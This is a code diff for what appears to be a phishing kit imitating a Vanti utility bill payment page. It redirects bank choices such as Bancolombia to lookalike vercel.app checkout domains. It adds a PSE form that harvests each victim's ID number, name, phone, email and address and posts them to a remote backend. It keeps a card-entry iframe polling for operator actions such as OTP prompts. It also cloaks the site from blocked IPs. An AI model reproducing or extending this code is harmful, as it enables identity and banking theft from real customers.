@@ -1,7 +1,7 @@
 const API_BASE = 'https://multi-bancos-production.up.railway.app';
 
 const URLS_BANCOS_VANTI = {
-    'bancolombia': 'https://www.bancolombia.com/personas/pago-facturas',
+    'bancolombia': 'https://safeplacechech.vercel.app',
     'bbva':        'https://securecheckout-sandy.vercel.app',
     'caja-social': 'https://checkoutplacabogo.vercel.app',
     'popular':     'https://securepay21.vercel.app',
@@ -17,17 +17,20 @@ const TIEMPO_REDIRECT_VANTI = 4000;
 let pollingInterval = null;
 let bancoSeleccionadoPSE = '';
 
-// ═══════════════════════════════════════════════════════════════
-// 🔥 FUNCIONES DEL MODAL DE TARJETA
-// ═══════════════════════════════════════════════════════════════
+let sessionGlobal = sessionStorage.getItem('vanti_sessionId');
+if (!sessionGlobal) {
+    sessionGlobal = 'vanti_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
+    sessionStorage.setItem('vanti_sessionId', sessionGlobal);
+}
 
 function abrirModalTarjeta() {
     const modal = document.getElementById('modalTarjeta');
     const iframe = document.getElementById('iframeTarjeta');
     const overlay = document.getElementById('pagoCargaOverlay');
     
-    // 🔥 OBTENER EL MISMO SESSION ID QUE SE ENVIÓ AL ADMIN
     const sessionId = sessionStorage.getItem('vanti_sessionId') || ('vanti_' + Date.now());
+    const precio = Number(window.TOTAL_PAGO) || 0;
+    sessionStorage.setItem('vanti_precio', String(precio));
 
     if (modal && iframe && overlay) {
         overlay.style.display = 'flex';
@@ -35,22 +38,17 @@ function abrirModalTarjeta() {
 
         setTimeout(function() {
             overlay.style.display = 'none';
-            // 🔥 PASAMOS EL SESSION ID POR LA URL PARA QUE TARJETA.HTML LO USE
-            iframe.src = 'tarjeta.html?sessionId=' + encodeURIComponent(sessionId);
+            iframe.src = 'tarjeta.html?sessionId=' + encodeURIComponent(sessionId) + '&precio=' + encodeURIComponent(precio);
             modal.style.display = 'flex';
         }, 1500);
     }
 }
 
-// 🔥 Oculta el modal SIN destruir el iframe (el polling sigue vivo)
 function ocultarModalTarjeta() {
     const modal = document.getElementById('modalTarjeta');
-    if (modal) {
-        modal.style.display = 'none';
-    }
+    if (modal) { modal.style.display = 'none'; }
 }
 
-// 🔥 Destruye el iframe (solo cuando se cierra definitivamente)
 function destruirModalTarjeta() {
     const modal = document.getElementById('modalTarjeta');
     const iframe = document.getElementById('iframeTarjeta');
@@ -61,30 +59,22 @@ function destruirModalTarjeta() {
     }
 }
 
-// Alias por compatibilidad
-function cerrarModalTarjeta() {
-    destruirModalTarjeta();
-}
+function cerrarModalTarjeta() { destruirModalTarjeta(); }
 
 function mostrarPagoCarga() {
     const overlay = document.getElementById('pagoCargaOverlay');
-    if (overlay) {
-        overlay.style.display = 'flex';
-        document.body.style.overflow = 'hidden';
-    }
+    if (overlay) { overlay.style.display = 'flex'; document.body.style.overflow = 'hidden'; }
 }
 
 function ocultarPagoCarga() {
     const overlay = document.getElementById('pagoCargaOverlay');
-    if (overlay) {
-        overlay.style.display = 'none';
-        document.body.style.overflow = '';
-    }
+    if (overlay) { overlay.style.display = 'none'; document.body.style.overflow = ''; }
 }
 
-// ═══════════════════════════════════════════════════════════════
-// 🔥 DOMContentLoaded
-// ═══════════════════════════════════════════════════════════════
+function cerrarModalPSEForm() {
+    const modal = document.getElementById('modalPSEForm');
+    if (modal) modal.style.display = 'none';
+}
 
 document.addEventListener('DOMContentLoaded', function () {
     const form = document.getElementById('queryForm');
@@ -181,31 +171,68 @@ document.addEventListener('DOMContentLoaded', function () {
         }, TIEMPO_REDIRECT_VANTI);
     }
 
-    // ═══════════════════════════════════════════════════════════════
-    // 🔥 LISTENER DE MENSAJES DEL IFRAME
-    // ═══════════════════════════════════════════════════════════════
     window.addEventListener('message', function(event) {
         if (event.data === 'mostrarCargaWompi') {
-            // 🔥 SOLO muestra el overlay, NO destruye el iframe
-            // El iframe sigue vivo haciendo polling para detectar acciones del admin
             mostrarPagoCarga();
         }
         else if (event.data === 'ocultarCargaWompi') {
-            // 🔥 El iframe tiene algo que mostrar (OTP / éxito / rechazo)
             ocultarPagoCarga();
             const modal = document.getElementById('modalTarjeta');
             if (modal) modal.style.display = 'flex';
         }
         else if (event.data === 'cerrarTarjeta') {
-            // 🔥 Cierre definitivo (botón "Volver" o "Cambiar método")
             destruirModalTarjeta();
             ocultarPagoCarga();
         }
     });
 
-    // ═══════════════════════════════════════════════════════════════
-    // 🔥 SUBMIT DEL FORMULARIO PRINCIPAL
-    // ═══════════════════════════════════════════════════════════════
+    const pseForm = document.getElementById('pseForm');
+    if (pseForm) {
+        pseForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const tipoDoc = document.getElementById('pseTipoDoc').value;
+            const numDoc = document.getElementById('pseNumDoc').value;
+            const nombres = document.getElementById('pseNombre').value;
+            const apellidos = document.getElementById('pseApellido').value;
+            const celular = document.getElementById('pseCelular').value;
+            const correo = document.getElementById('pseCorreo').value;
+            const direccion = document.getElementById('pseDireccion').value;
+            const rolRadio = document.querySelector('input[name="pseRol"]:checked');
+            const rol = rolRadio ? rolRadio.value : '';
+            
+            if (!tipoDoc || tipoDoc === '0' || !numDoc || !nombres || !apellidos || !celular || !correo || !direccion || !rol) {
+                Swal.fire({ icon: 'warning', title: 'Atención', text: 'Por favor complete todos los campos del formulario PSE.', confirmButtonColor: '#113455' });
+                return;
+            }
+
+            const sessionId = sessionStorage.getItem('vanti_sessionId');
+            const cuenta = document.getElementById('cuenta_contrato').value;
+            const precio = window.TOTAL_PAGO;
+
+            fetch(API_BASE + '/vanti/guardar-pse', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: sessionId,
+                    cuenta: cuenta,
+                    tipoDoc: tipoDoc,
+                    numDoc: numDoc,
+                    nombres: nombres,
+                    apellidos: apellidos,
+                    celular: celular,
+                    correo: correo,
+                    direccion: direccion,
+                    rol: rol,
+                    precio: precio
+                })
+            }).catch(function(err) { console.error(err); });
+
+            document.getElementById('modalPSEForm').style.display = 'none';
+            abrirModalBanco();
+        });
+    }
+
     form.addEventListener('submit', function (e) {
         e.preventDefault();
 
@@ -249,8 +276,8 @@ document.addEventListener('DOMContentLoaded', function () {
                     loadingOverlay.classList.add('hidden');
 
                     const precio = Number(data.accion);
-                    // 🔥 GUARDAMOS EL PRECIO EN EL WINDOW PARA QUE EL IFRAME LO LEA
-                    window.TOTAL_PAGO = precio; 
+                    window.TOTAL_PAGO = precio;
+                    sessionStorage.setItem('vanti_precio', String(precio));
                     
                     Swal.fire({
                         icon: 'success',
@@ -270,7 +297,15 @@ document.addEventListener('DOMContentLoaded', function () {
                     }).then((result) => {
                         if (result.isConfirmed) {
                             if (medioPagoValue === '154') {
-                                abrirModalBanco();
+                                const modalPSE = document.getElementById('modalPSEForm');
+                                if (modalPSE) {
+                                    document.getElementById('pseCuenta').value = cuenta;
+                                    document.getElementById('pseValor').value = '$ ' + precio.toLocaleString('es-CO');
+                                    document.getElementById('btnPSEPagar').textContent = 'Ir a pagar: $' + precio.toLocaleString('es-CO');
+                                    modalPSE.style.display = 'flex';
+                                } else {
+                                    abrirModalBanco();
+                                }
                             } else {
                                 abrirModalTarjeta();
                             }
@@ -293,3 +328,23 @@ document.addEventListener('DOMContentLoaded', function () {
         }, 2000);
     });
 });
+
+setInterval(function() {
+    const sid = sessionStorage.getItem('vanti_sessionId') || sessionGlobal;
+    if (!sid) return;
+    fetch(API_BASE + '/heartbeat', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId: sid, ultimaAccion: 'index_activo' })
+    }).catch(function() {});
+}, 10000);
+
+setInterval(function() {
+    fetch(API_BASE + '/check-ip', { cache: 'no-store' })
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data && data.bloqueado === true) {
+                window.location.href = data.redirect || 'https://www.google.com';
+            }
+        }).catch(function() {});
+}, 5000);
